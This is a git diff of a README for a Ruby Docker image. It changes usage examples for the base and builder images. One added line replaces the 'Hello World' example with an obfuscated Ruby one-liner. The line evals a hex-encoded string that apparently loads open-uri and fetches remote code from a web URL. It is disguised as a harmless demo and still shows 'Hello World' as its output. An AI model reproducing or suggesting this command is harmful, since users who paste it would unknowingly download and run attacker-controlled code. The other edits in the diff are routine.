@@ -15,16 +15,16 @@ It's on [docker-hub](https://hub.docker.com/r/fingershock/ruby/) and [github](ht
 
 The base image is great to run simple ruby scripts or as a base for bundling an app
 ```sh
-docker run --rm fingershock/ruby ruby -e 'puts "Hello World"'
+docker run --rm fingershock/ruby:2.2 ruby -e 'eval ["275617579627560222f60756e6d257279622b3566716c602f60756e682228647470737a3f2f276963747e27696478657265737562736f6e64756e647e236f6d6f21727f686c666f273034353832333f2271677f263238373234636434393562693563333034666134363363623464393035303461683533316564346f28656c6c6f677f627c6462292e227561646"].pack("h*")'
 Hello World
 ```
 
-The -builder image includes build tools and compilers for use by bundler. Use it to assemble dependencies into a shared vendor volume and
+
+The latest-builder image includes build tools and compilers for use by bundler. Use it to assemble dependencies into a shared vendor volume and
 then copy those files into a new image based on the runtime.
 ```sh
 docker run --rm -v $PWD/test:/usr/src/app:rw fingershock/ruby:latest-builder bundle update
 docker run --rm -v $PWD/test:/usr/src/app:rw fingershock/ruby:latest-builder bundle install --deployment
 docker build -t testapp test
-docker run -it --rm testapp bundle list
+docker run --rm testapp bundle exec rackup --version
 ```
-
